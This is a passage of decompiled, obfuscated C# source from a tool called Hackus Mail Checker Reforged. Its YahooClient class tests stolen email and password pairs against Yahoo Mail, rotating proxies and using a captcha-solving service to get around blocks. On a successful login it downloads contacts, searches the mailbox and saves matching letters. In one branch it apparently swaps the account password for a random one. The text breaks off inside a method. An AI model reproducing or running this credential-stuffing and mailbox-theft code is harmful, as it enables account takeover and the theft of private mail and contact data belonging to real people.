using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.Yahoo;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net.Web
{
	// Token: 0x020000BD RID: 189
	public class YahooClient
	{
		// Token: 0x1700013D RID: 317
		// (get) Token: 0x060005FB RID: 1531 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060005FC RID: 1532 RVA: 0x00009DA5 File Offset: 0x00007FA5
		public YahooClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x060005FD RID: 1533 RVA: 0x000293D0 File Offset: 0x000275D0
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x060005FE RID: 1534 RVA: 0x00029444 File Offset: 0x00027644
		public OperationResult Login()
		{
			int num = 0;
			OperationResult operationResult2;
			for (;;)
			{
				this.Reset();
				OperationResult operationResult = this.CreateSession();
				if (operationResult == OperationResult.Blocked)
				{
					if (!ProxySettings.Instance.UseProxy)
					{
						return OperationResult.Error;
					}
				}
				if (operationResult == OperationResult.Ok)
				{
					string captchaUrl;
					operationResult = this.ConfirmUsername(out captchaUrl);
					if (operationResult != OperationResult.HttpError)
					{
						if (operationResult == OperationResult.Captcha)
						{
							if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
							{
								operationResult2 = this.GetSitekey(captchaUrl);
								if (operationResult2 == OperationResult.Error)
								{
									break;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
								ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveRecaptchaV2Proxyless(YahooClient._siteKey, <Module>.smethod_6<string>(-1956927799));
								OperationResult item = valueTuple.Item1;
								string item2 = valueTuple.Item2;
								if (item == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (item == OperationResult.HttpError)
								{
									continue;
								}
								operationResult2 = this.ConfirmCaptcha(item2, false);
								if (operationResult2 == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
							}
							else
							{
								if (!ProxySettings.Instance.UseProxy)
								{
									return OperationResult.Captcha;
								}
								if (WebSettings.Instance.RebruteCaptcha && num < WebSettings.Instance.RebruteCaptchaLimit)
								{
									num++;
									continue;
								}
								return OperationResult.Captcha;
							}
						}
						else if (operationResult != OperationResult.Ok)
						{
							return operationResult;
						}
						string text;
						operationResult = this.ConfirmPassword(out text);
						if (operationResult != OperationResult.HttpError)
						{
							if (operationResult == OperationResult.Captcha)
							{
								if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
								{
									return OperationResult.Captcha;
								}
								ValueTuple<OperationResult, string> valueTuple2 = CaptchaHelpers.CreateInstance().SolveRecaptchaV2Proxyless(YahooClient._siteKey, <Module>.smethod_4<string>(1403483811));
								OperationResult item3 = valueTuple2.Item1;
								string item4 = valueTuple2.Item2;
								if (item3 == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (item3 == OperationResult.HttpError)
								{
									continue;
								}
								operationResult = this.ConfirmSecondCaptcha(item4);
							}
							else if (operationResult != OperationResult.Ok)
							{
								return operationResult;
							}
							if (operationResult != OperationResult.HttpError)
							{
								return operationResult;
							}
						}
					}
				}
			}
			return operationResult2;
		}

		// Token: 0x060005FF RID: 1535 RVA: 0x000295F8 File Offset: 0x000277F8
		public OperationResult CreateSession()
		{
			try
			{
				string text = this._httpRequest.Get(<Module>.smethod_4<string>(1704047617), null).ToString();
				if (text == <Module>.smethod_3<string>(103325232))
				{
					return OperationResult.Blocked;
				}
				Match match = Regex.Match(text, <Module>.smethod_3<string>(-458561052));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._crumb = match.Groups[1].Value;
				match = Regex.Match(text, <Module>.smethod_5<string>(-588766955));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._acrumb = match.Groups[1].Value;
				match = Regex.Match(text, <Module>.smethod_6<string>(2066767619));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._sessionIndex = match.Groups[1].Value;
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000600 RID: 1536 RVA: 0x00029704 File Offset: 0x00027904
		public OperationResult ConfirmUsername(out string captchaUrl)
		{
			captchaUrl = null;
			this.WaitPause();
			try
			{
				this._httpRequest.AddHeader(<Module>.smethod_6<string>(578231860), <Module>.smethod_6<string>(-1495379571));
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_5<string>(961840339), this._crumb),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(1030826796), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_5<string>(771888973), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(-1728918827), <Module>.smethod_4<string>(-678169520)),
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(-1276201499), this._mailbox.Address)
				}, false, null);
				string text = this._httpRequest.Post(<Module>.smethod_3<string>(-1412983532), formUrlEncodedContent).ToString();
				if (text.ContainsOne(new string[]
				{
					<Module>.smethod_2<string>(-1041640852),
					<Module>.smethod_4<string>(1001945306),
					<Module>.smethod_6<string>(-1654457),
					<Module>.smethod_5<string>(2133339535),
					<Module>.smethod_6<string>(1032556581)
				}))
				{
					return OperationResult.Bad;
				}
				if (text.ContainsOne(new string[]
				{
					<Module>.smethod_5<string>(-1159415687),
					<Module>.smethod_2<string>(772635631),
					<Module>.smethod_2<string>(1504329341),
					<Module>.smethod_4<string>(-1196331695),
					<Module>.smethod_2<string>(106246092)
				}))
				{
					return OperationResult.Blocked;
				}
				if (!text.Contains(<Module>.smethod_5<string>(-961516101)))
				{
					if (text.Contains(<Module>.smethod_6<string>(-1622366585)))
					{
						return OperationResult.Ok;
					}
					if (text == <Module>.smethod_2<string>(1297619568) && ProxySettings.Instance.UseProxy)
					{
						return OperationResult.HttpError;
					}
					return OperationResult.Error;
				}
				else
				{
					Match match = Regex.Match(text, <Module>.smethod_6<string>(1322856094));
					if (!match.Success)
					{
						return OperationResult.Blocked;
					}
					captchaUrl = <Module>.smethod_5<string>(307739997) + match.Groups[1].Value;
					return OperationResult.Captcha;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000601 RID: 1537 RVA: 0x00029970 File Offset: 0x00027B70
		public OperationResult ConfirmPassword(out string captchaUrl)
		{
			captchaUrl = null;
			this.WaitPause();
			try
			{
				this._httpRequest.Reconnect = true;
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(551711604), <Module>.smethod_3<string>(-1643879396));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(771888973), this._sessionIndex);
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-1470570358), this._acrumb);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(1904177939), <Module>.smethod_3<string>(-269870438));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(275948997), <Module>.smethod_6<string>(-1044514420));
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(1277145078), this._crumb),
					new KeyValuePair<string, string>(<Module>.smethod_5<string>(-1470570358), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_5<string>(771888973), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(-127570632), <Module>.smethod_4<string>(-678169520)),
					new KeyValuePair<string, string>(<Module>.smethod_2<string>(-1803175773), this._mailbox.Address),
					new KeyValuePair<string, string>(<Module>.smethod_5<string>(-483856467), this._mailbox.Address),
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(893801997), this._mailbox.Password),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(-304062465), <Module>.smethod_6<string>(-749025552)),
					new KeyValuePair<string, string>(<Module>.smethod_2<string>(-1408849760), <Module>.smethod_2<string>(-1922937273))
				}, false, null);
				string text = this._httpRequest.Post(<Module>.smethod_5<string>(-1426857968), formUrlEncodedContent).ToString();
				if (!text.Contains(<Module>.smethod_4<string>(-1433163340)))
				{
					if (text.ContainsOne(new string[]
					{
						<Module>.smethod_4<string>(944245478),
						<Module>.smethod_6<string>(-101981987),
						<Module>.smethod_4<string>(-1602678519)
					}))
					{
						return OperationResult.Ok;
					}
					if (this._httpRequest.Response.Location != null && this._httpRequest.Response.Location.Contains(<Module>.smethod_4<string>(242143167)))
					{
						return OperationResult.Ok;
					}
					if (!text.Contains(<Module>.smethod_4<string>(-1943457161)))
					{
						if (text.ContainsOne(new string[]
						{
							<Module>.smethod_2<string>(-2072539984),
							<Module>.smethod_3<string>(1117432185),
							<Module>.smethod_3<string>(-287283525)
						}))
						{
							return OperationResult.Blocked;
						}
						if (text.ContainsOne(new string[]
						{
							<Module>.smethod_4<string>(-1162061455),
							<Module>.smethod_6<string>(-1795345085),
							<Module>.smethod_2<string>(688337091),
							<Module>.smethod_6<string>(492455319),
							<Module>.smethod_3<string>(638293506),
							<Module>.smethod_2<string>(489750054)
						}))
						{
							return OperationResult.Bad;
						}
						if (text == <Module>.smethod_2<string>(1297619568) && ProxySettings.Instance.UseProxy)
						{
							return OperationResult.HttpError;
						}
						return OperationResult.Error;
					}
					else
					{
						Match match = Regex.Match(text, <Module>.smethod_2<string>(-1106920232));
						if (match.Success)
						{
							captchaUrl = <Module>.smethod_6<string>(-297143325) + match.Groups[1].Value;
							return OperationResult.Captcha;
						}
						return OperationResult.Blocked;
					}
				}
				else
				{
					text = this._httpRequest.Get(this._httpRequest.Response.Location, null).ToString();
					Match match2 = Regex.Match(text, <Module>.smethod_5<string>(-1273863663));
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					string text2 = WebUtility.HtmlDecode(<Module>.smethod_2<string>(-1071556436) + match2.Groups[1].Value);
					match2 = Regex.Match(text2, <Module>.smethod_2<string>(372811824));
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					string value = match2.Groups[1].Value;
					match2 = Regex.Match(text2, <Module>.smethod_4<string>(934628840));
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					string value2 = match2.Groups[1].Value;
					string text3 = PasswordHelper.Generate(16);
					text = this._httpRequest.Get(text2, null).ToString();
					if (text.Contains(<Module>.smethod_3<string>(484362930)))
					{
						return OperationResult.Ok;
					}
					match2 = Regex.Match(text, <Module>.smethod_4<string>(-1520325089));
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					this._crumb = match2.Groups[1].Value;
					formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
					{
						new KeyValuePair<string, string>(<Module>.smethod_6<string>(933958836), value),
						new KeyValuePair<string, string>(<Module>.smethod_4<string>(-416684273), this._crumb),
						new KeyValuePair<string, string>(<Module>.smethod_2<string>(5602916), value2),
						new KeyValuePair<string, string>(<Module>.smethod_5<string>(-940057223), text3)
					}, false, null);
					text = this._httpRequest.Post(text2, formUrlEncodedContent).ToString();
					if (text.Contains(<Module>.smethod_6<string>(-1139652595)))
					{
						this._mailbox.Password = text3;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000602 RID: 1538 RVA: 0x00029F40 File Offset: 0x00028140
		public OperationResult GetSitekey(string captchaUrl)
		{
			if (YahooClient._siteKey != null)
			{
				return OperationResult.Ok;
			}
			this.WaitPause();
			try
			{
				Match match = Regex.Match(this._httpRequest.Get(captchaUrl, null).ToString(), <Module>.smethod_4<string>(-1912858963));
				if (match.Success)
				{
					YahooClient._siteKey = match.Groups[1].Value;
					return OperationResult.Ok;
				}
				return OperationResult.Error;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000603 RID: 1539 RVA: 0x00029FCC File Offset: 0x000281CC
		public OperationResult ConfirmCaptcha(string captchaResult, bool isSecondCaptcha = false)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(551711604), <Module>.smethod_6<string>(190047311));
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-1190529069), this._sessionIndex);
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(1689622660), this._acrumb);
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-453536684), <Module>.smethod_6<string>(-1978702295));
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(-1142284028), <Module>.smethod_2<string>(938558187));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-478690406), <Module>.smethod_6<string>(279996131));
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(174224787), <Module>.smethod_6<string>(-1766651449));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(157227388), <Module>.smethod_5<string>(1510633816));
				if (isSecondCaptcha)
				{
					this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(1239388958), <Module>.smethod_3<string>(45766606));
					this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(-72845596), <Module>.smethod_3<string>(-1451333904));
				}
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(-1715630147), captchaResult),
					new KeyValuePair<string, string>(<Module>.smethod_3<string>(-1291753283), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1190529069), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(2058118694), <Module>.smethod_2<string>(938558187))
				}, false, null);
				if (!this._httpRequest.Post(<Module>.smethod_5<string>(1353664461), formUrlEncodedContent).ToString().Contains(<Module>.smethod_4<string>(-828451423)))
				{
					return OperationResult.Error;
				}
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000604 RID: 1540 RVA: 0x0002A204 File Offset: 0x00028404
		public OperationResult ConfirmSecondCaptcha(string captchaResult)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(551711604), <Module>.smethod_3<string>(-1882485016));
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-1190529069), this._sessionIndex);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(506069899), this._acrumb);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(1904177939), <Module>.smethod_5<string>(1847220535));
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(-1142284028), <Module>.smethod_6<string>(-1044514420));
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-1793615300), <Module>.smethod_4<string>(-1564211967));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(-1568841547), <Module>.smethod_3<string>(-1051087952));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(157227388), <Module>.smethod_4<string>(1215959370));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(1883296323), <Module>.smethod_2<string>(609511554));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-1998301334), <Module>.smethod_2<string>(-46006352));
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(-1017550569), captchaResult),
					new KeyValuePair<string, string>(<Module>.smethod_6<string>(1030826796), this._acrumb),
					new KeyValuePair<string, string>(<Module>.smethod_2<string>(1754575228), this._sessionIndex),
					new KeyValuePair<string, string>(<Module>.smethod_4<string>(-1825697214), <Module>.smethod_4<string>(-586199452))
				}, false, null);
				string original = this._httpRequest.Post(<Module>.smethod_4<string>(1627114513), formUrlEncodedContent).ToString();
				if (original.ContainsOne(new string[]
				{
					<Module>.smethod_5<string>(-23284284),
					<Module>.smethod_2<string>(-1093299702)
				}))
				{
					return OperationResult.Ok;
				}
				if (this._httpRequest.Response.Location != null && this._httpRequest.Response.Location.Contains(<Module>.smethod_6<string>(-101981987)))
				{
					return OperationResult.Ok;
				}
				if (original.ContainsOne(new string[]
				{
					<Module>.smethod_5<string>(-1159415687),
					<Module>.smethod_3<string>(1117432185),
					<Module>.smethod_6<string>(1618344962)
				}))
				{
					return OperationResult.Blocked;
				}
				if (!original.ContainsOne(new string[]
				{
					<Module>.smethod_4<string>(-1162061455),
					<Module>.smethod_2<string>(-1474129140),
					<Module>.smethod_6<string>(-247996636),
					<Module>.smethod_5<string>(-1769803639),
					<Module>.smethod_5<string>(-441733345),
					<Module>.smethod_6<string>(-1929251239)
				}))
				{
					return OperationResult.Error;
				}
				return OperationResult.Bad;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000605 RID: 1541 RVA: 0x0002A528 File Offset: 0x00028728
		public OperationResult GetSearchToken()
		{
			this.WaitPause();
			try
			{
				string input = this._httpRequest.Get(<Module>.smethod_6<string>(784484617), null).ToString();
				Match match = Regex.Match(input, <Module>.smethod_5<string>(1126756034));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._wssid = match.Groups[1].Value;
				match = Regex.Match(input, <Module>.smethod_5<string>(936804668));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._mailboxId = match.Groups[1].Value;
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000606 RID: 1542 RVA: 0x0002A5E8 File Offset: 0x000287E8
		public void ProcessValid()
		{
			if (!this.SearchSettings.Search && !SearchSettings.Instance.ParseContacts)
			{
				return;
			}
			this._httpRequest.Reconnect = false;
			if (this.GetSearchToken() != OperationResult.Ok)
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			bool flag = false;
			bool flag2 = false;
			List<Request> list = new List<Request>();
			new List<Mid>();
			while (operationResult == OperationResult.Retry)
			{
				if (!flag && SearchSettings.Instance.ParseContacts)
				{
					operationResult = this.DownloadContacts();
					if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
					{
						flag = true;
					}
				}
				else
				{
					operationResult = OperationResult.Ok;
				}
				if (operationResult != OperationResult.Retry)
				{
					if (!flag2 && this.SearchSettings.Search)
					{
						operationResult = this.SearchMessages(list);
						if (operationResult == OperationResult.Ok)
						{
							flag2 = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult == OperationResult.Retry)
					{
						if (!ProxySettings.Instance.UseProxy)
						{
							break;
						}
						this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
					}
					else if (operationResult == OperationResult.Bad)
					{
						break;
					}
				}
				else
				{
					if (!ProxySettings.Instance.UseProxy)
					{
						break;
					}
					this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
				}
			}
			foreach (Request request in list)
			{
				int count = request.Count;
				if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
				{
					MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
				}
			}
		}

		// Token: 0x06000607 RID: 1543 RVA: 0x0002A79C File Offset: 0x0002899C
		public OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(1871513458), 100);
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(-35185832), 1);
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(-1074255751), <Module>.smethod_5<string>(1279750339));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(-1439901542), this._mailboxId);
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(-2001787826), this._mailboxId);
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(-1612295157), this._mailbox.Address);
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-851082867), <Module>.smethod_6<string>(-108901127));
				foreach (object obj in Regex.Matches(this._httpRequest.Get(<Module>.smethod_4<string>(1370437585), null).ToString(), <Module>.smethod_2<string>(1855243195)))
				{
					FileManager.SaveContact(((Match)obj).Groups[1].Value);
				}
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000608 RID: 1544 RVA: 0x0002A948 File Offset: 0x00028B48
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => YahooClient.<>c__DisplayClass22_0.smethod_0(r.Sender, request.Sender) && YahooClient.<>c__DisplayClass22_0.smethod_0(r.Body, request.Body) && YahooClient.<>c__DisplayClass22_0.smethod_0(r.Subject, request.Subject));
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedMids = new HashSet<Mid>();
						request3.SavedMids = new HashSet<Mid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedMids != null && request3.SavedMids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					Request request2 = request3;
					if (!request2.FindedMids.Any<Mid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedMids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedMids = new HashSet<Mid>(request3.FindedMids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Mid>.Enumerator enumerator2 = request3.FindedMids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Mid mid = enumerator2.Current;
								if (!request3.SavedMids.Any((Mid u) => u == mid))
								{
									if (request3.SavedMids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(mid, this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedMids.Add(mid);
										FileManager.SaveEazyWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedMids.Add(mid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000609 RID: 1545 RVA: 0x0002ABDC File Offset: 0x00028DDC
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(576365206), <Module>.smethod_6<string>(-271909259));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-1194783480), <Module>.smethod_5<string>(1279750339));
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(-1324501638), <Module>.smethod_6<string>(-1588075252));
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(1373732568), <Module>.smethod_6<string>(1565738703));
				this._httpRequest.AddUrlParam(<Module>.smethod_4<string>(-474384101), <Module>.smethod_5<string>(1010718790));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(-1439901542), this._mailboxId);
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-208069589), this._mailboxId);
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-587972321), this._mailbox.Address);
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-851082867), <Module>.smethod_4<string>(-1171678093));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(-1559204352), this.BuildSearchQuery(searchRequest));
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(-1363275968), <Module>.smethod_5<string>(-415504783));
				this._httpRequest.AddUrlParam(<Module>.smethod_3<string>(518990696), this._wssid);
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-1268369394), <Module>.smethod_5<string>(-640427565));
				string input = this._httpRequest.Get(<Module>.smethod_6<string>(-378443220), null).ToString();
				Match match = Regex.Match(input, <Module>.smethod_2<string>(-1955552172));
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				if (!(match.Groups[1].Value == <Module>.smethod_6<string>(-371219713)))
				{
					match = Regex.Match(input, <Module>.smethod_2<string>(-323518090));
					if (match.Success)
					{
						try
						{
							List<MessagePreview> list = JsonConvert.DeserializeObject<List<MessagePreview>>(match.Groups[1].Value);
							Encoding encoding = Encoding.GetEncoding(<Module>.smethod_3<string>(-1969087499));
							Encoding encoding2 = Encoding.GetEncoding(<Module>.smethod_3<string>(-243018564));
							foreach (MessagePreview messagePreview in list)
							{
								byte[] bytes = encoding2.GetBytes(messagePreview.Subject);
								byte[] bytes2 = Encoding.Convert(encoding, encoding2, bytes);
								messagePreview.Subject = encoding2.GetString(bytes2).Replace(<Module>.smethod_5<string>(805269241), "");
								if (this.Validate(searchRequest, messagePreview.FromList.First<PreviewFrom>().Id, messagePreview.Subject, messagePreview.DateTime))
								{
									searchRequest.FindedMids.Add(new Mid(messagePreview.Mid));
								}
							}
						}
						catch
						{
							return OperationResult.Error;
						}
					}
					searchRequest.Count = searchRequest.FindedMids.Count;
					return OperationResult.Ok;
				}
				return OperationResult.Ok;
			}
			catch (HttpException)
			{
				return OperationResult.HttpError;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x0600060A RID: 1546 RVA: 0x0002AF94 File Offset: 0x00029194
		private OperationResult FetchMessage(Mid mid, bool downloadAttachments, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				this._httpRequest.AddUrlParam(<Module>.smethod_5<string>(1290480718), <Module>.smethod_3<string>(-1085847990));
				this._httpRequest.AddUrlParam(<Module>.smethod_2<string>(-1074255751), <Module>.smethod_6<string>(2117644093));
				this._httpRequest.AddUrlParam(<Module>.smethod_6<string>(-675661873), this._wssid);
				string text = string.Concat(new string[]
				{
					<Module>.smethod_2<string>(242253064),
					this._mailboxId,
					<Module>.smethod_4<string>(1142610571),
					mid.MID,
					<Module>.smethod_6<string>(1837723290)
				});
				Match match = Regex.Match(this._httpRequest.Post(<Module>.smethod_4<string>(1665581065), text, <Module>.smethod_3<string>(-1143472752)).ToString(), <Module>.smethod_2<string>(274892754));
				if (match.Success)
				{
					try
					{
						MessageWrapper messageWrapper = JsonConvert.DeserializeObject<MessageWrapper>(match.Groups[1].Value);
						Encoding encoding = Encoding.GetEncoding(<Module>.smethod_4<string>(256568124));
						Encoding encoding2 = Encoding.GetEncoding(<Module>.smethod_2<string>(-456800956));
						message.Date = messageWrapper.Message.Headers.DateTime;
						byte[] bytes = encoding2.GetBytes(messageWrapper.Message.Headers.Subject);
						byte[] bytes2 = Encoding.Convert(encoding, encoding2, bytes);
						message.Subject = encoding2.GetString(bytes2);
						bytes = encoding2.GetBytes(messageWrapper.SimpleBody.Html);
						bytes2 = Encoding.Convert(encoding, encoding2, bytes);
						message.From = messageWrapper.Message.Headers.From.First<From>().Email;
						message.AlternateViews.Add(new Attachment(<Module>.smethod_2<string>(642151244), <Module>.smethod_3<string>(1331179506) + encoding2.GetString(bytes2)));
					}
					catch
					{
						return OperationResult.Error;
					}
				}
				return OperationResult.Ok;
			}
			catch (HttpException)
			{
				return OperationResult.HttpError;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x0600060B RID: 1547 RVA: 0x0002B200 File Offset: 0x00029400
		private string BuildSearchQuery(Request request)
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (request.Sender != null)
			{
				stringBuilder.Append(<Module>.smethod_2<string>(-2037151397) + request.Sender + <Module>.smethod_5<string>(-521209905));
			}
			if (request.Subject != null)
			{
				stringBuilder.Append(<Module>.smethod_6<string>(946067331) + request.Subject);
			}
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null)
					{
						stringBuilder.Append(<Module>.smethod_5<string>(-1015164236) + SearchSettings.Instance.DateFrom.Value.ToString(<Module>.smethod_3<string>(88104128)) + <Module>.smethod_6<string>(-239347711));
					}
